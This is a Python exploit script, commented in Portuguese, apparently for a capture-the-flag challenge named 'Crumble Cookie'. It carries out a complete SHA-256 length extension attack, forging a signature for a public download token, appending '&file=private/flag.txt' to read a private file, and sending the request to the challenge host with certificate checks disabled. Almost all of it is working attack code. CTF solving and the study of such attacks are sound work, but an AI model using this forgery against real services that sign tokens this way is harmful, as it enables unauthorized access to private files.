#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit para o desafio Crumble Cookie.

Falha explorada:
- A aplicação assina tokens usando SHA256(SECRET_KEY + token).
- Isso é vulnerável a length extension attack.
- O segredo tem 16 caracteres, conforme comentário no app.py.
- O parser aceita parâmetros repetidos e o último "file" sobrescreve o anterior.

Objetivo:
- Pegar um token público válido.
- Estender esse token com "&file=private/flag.txt".
- Gerar uma nova assinatura SHA256 válida sem conhecer SECRET_KEY.
- Baixar a flag.
"""

import json
import os
import re
import ssl
import struct
import sys
import urllib.parse
import urllib.request
import urllib.error


# Constantes oficiais do SHA-256.
K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]


def rotr(x, n):
    """Rotação de bits para a direita, operação usada internamente pelo SHA-256."""
    return ((x >> n) | (x << (32 - n))) & 0xffffffff


def sha256_compress(chunk, h):
    """
    Processa um bloco de 64 bytes do SHA-256 a partir de um estado interno h.

    Isso é necessário porque no length extension attack nós continuamos o hash
    a partir do digest conhecido, como se o SHA-256 ainda estivesse processando dados.
    """
    w = list(struct.unpack(">16I", chunk)) + [0] * 48

    for i in range(16, 64):
        s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >> 3)
        s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >> 10)
        w[i] = (w[i - 16] + s0 + w[i - 7] + s1) & 0xffffffff

    a, b, c, d, e, f, g, hh = h

    for i in range(64):
        S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
        ch = (e & f) ^ ((~e) & g)
        temp1 = (hh + S1 + ch + K[i] + w[i]) & 0xffffffff

        S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
        maj = (a & b) ^ (a & c) ^ (b & c)
        temp2 = (S0 + maj) & 0xffffffff

        hh = g
        g = f
        f = e
        e = (d + temp1) & 0xffffffff
        d = c
        c = b
        b = a
        a = (temp1 + temp2) & 0xffffffff

    return [(x + y) & 0xffffffff for x, y in zip(h, [a, b, c, d, e, f, g, hh])]


def sha256_padding(message_len):
    """
    Gera o padding padrão do SHA-256 para uma mensagem de tamanho message_len.

    No servidor, a mensagem real assinada é:
    SECRET_KEY + token_original

    Como o SECRET_KEY tem 16 bytes, conseguimos calcular o padding exato usado
    após SECRET_KEY + token_original.
    """
    return (
        b"\x80"
        + b"\x00" * ((56 - (message_len + 1) % 64) % 64)
        + struct.pack(">Q", message_len * 8)
    )


def sha256_continue(data, initial_state, previous_len):
    """
    Continua o SHA-256 a partir de um estado interno já conhecido.

    previous_len é o tamanho já processado antes de adicionar data.
    """
    h = initial_state[:]

    final_data = data + sha256_padding(previous_len + len(data))

    if len(final_data) % 64 != 0:
        raise RuntimeError("Padding SHA-256 inválido. O tamanho final não fechou bloco de 64 bytes.")

    for i in range(0, len(final_data), 64):
        h = sha256_compress(final_data[i:i + 64], h)

    return "".join(f"{x:08x}" for x in h)


def length_extend_sha256(old_sig_hex, original_message, extension, secret_len):
    """
    Executa o length extension attack.

    Entrada:
    - old_sig_hex: SHA256(secret + original_message)
    - original_message: token público conhecido
    - extension: dados que queremos acrescentar
    - secret_len: tamanho conhecido do segredo

    Saída:
    - forged_message: token original + padding + extensão
    - forged_sig: assinatura válida para secret + forged_message
    """
    initial_state = list(struct.unpack(">8I", bytes.fromhex(old_sig_hex)))

    original_total_len = secret_len + len(original_message)
    glue_padding = sha256_padding(original_total_len)

    forged_message = original_message + glue_padding + extension

    previous_len = original_total_len + len(glue_padding)
    forged_sig = sha256_continue(extension, initial_state, previous_len)

    return forged_message, forged_sig


def http_get(url):
    """Faz uma requisição GET simples e retorna status e corpo."""
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "ctf-length-extension-client/1.0"
        },
    )

    context = ssl._create_unverified_context()

    try:
        with urllib.request.urlopen(req, timeout=15, context=context) as response:
            body = response.read().decode("utf-8", errors="replace")
            return response.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return e.code, body


def discover_base(target):
    """
    Descobre se o serviço responde em http ou https.

    A UI do desafio mostra HTTP, então normalmente será http://host.
    Mesmo assim testamos os dois para evitar perder tempo se houver TLS.
    """
    if target.startswith("http://") or target.startswith("https://"):
        candidates = [target.rstrip("/")]
    else:
        candidates = [
            "http://" + target.strip("/"),
            "https://" + target.strip("/"),
        ]

    for base in candidates:
        status, body = http_get(base + "/files")
        if status == 200 and "files" in body:
            return base, body

    print("[-] Não consegui acessar /files em http nem https.")
    for base in candidates:
        status, body = http_get(base + "/")
        print(f"[debug] {base}/ -> HTTP {status} -> {body[:200]!r}")

    sys.exit(1)


def main():
    target = os.environ.get("TARGET", "9c3414f6c6555f5b.chal.ctf.ae")
    secret_len = 16

    print(f"[*] Target: {target}")
    print(f"[*] Tamanho conhecido do SECRET_KEY: {secret_len} bytes")

    base, files_body = discover_base(target)

    print(f"[*] Base URL funcionando: {base}")
    print()
    print("=" * 80)
    print("RESPOSTA DE /files")
    print("=" * 80)
    print(files_body)

    data = json.loads(files_body)

    # Preferimos notes.txt, mas qualquer arquivo público assinado serve.
    chosen = None
    for item in data.get("files", []):
        if item.get("path") == "public/notes.txt":
            chosen = item
            break

    if chosen is None:
        chosen = data["files"][0]

    original_token = chosen["token"].encode("latin-1")
    original_sig = chosen["sig"]

    print()
    print("=" * 80)
    print("TOKEN PÚBLICO ESCOLHIDO")
    print("=" * 80)
    print(f"token: {chosen['token']}")
    print(f"sig:   {original_sig}")

    # Este parâmetro será interpretado depois do padding.
    # Como parse_token_params sobrescreve chaves repetidas, este file vence.
    extension = b"&file=private/flag.txt"

    forged_token_bytes, forged_sig = length_extend_sha256(
        old_sig_hex=original_sig,
        original_message=original_token,
        extension=extension,
        secret_len=secret_len,
    )

    # Importante:
    # A aplicação faz request.args.get("token") e depois token.encode("latin-1").
    # Por isso decodificamos os bytes como latin-1 e deixamos urlencode gerar UTF-8.
    # Assim bytes como 0x80 voltam corretamente para 0x80 no servidor.
    forged_token_str = forged_token_bytes.decode("latin-1")

    query = urllib.parse.urlencode({
        "token": forged_token_str,
        "sig": forged_sig,
    })

    exploit_url = base + "/download?" + query

    print()
    print("=" * 80)
    print("TOKEN FORJADO")
    print("=" * 80)
    print(f"forged_sig: {forged_sig}")
    print(f"forged_token_bytes: {forged_token_bytes!r}")
    print()
    print("[*] Enviando token forjado para /download...")

    status, body = http_get(exploit_url)

    print()
    print("=" * 80)
    print("RESPOSTA DO SERVIDOR")
    print("=" * 80)
    print(f"HTTP {status}")
    print(body)

    match = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)

    print()
    print("=" * 80)
    print("RESULTADO")
    print("=" * 80)

    if match:
        flag = match.group(0)
        print(f"[+] FLAG ENCONTRADA: {flag}")

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        return 0

    print("[-] Flag não encontrada automaticamente.")
    print("[-] Se o HTTP foi 403, o problema pode ser encoding do token.")
    print("[-] Se o HTTP foi 500, provavelmente algum byte não chegou como latin-1.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
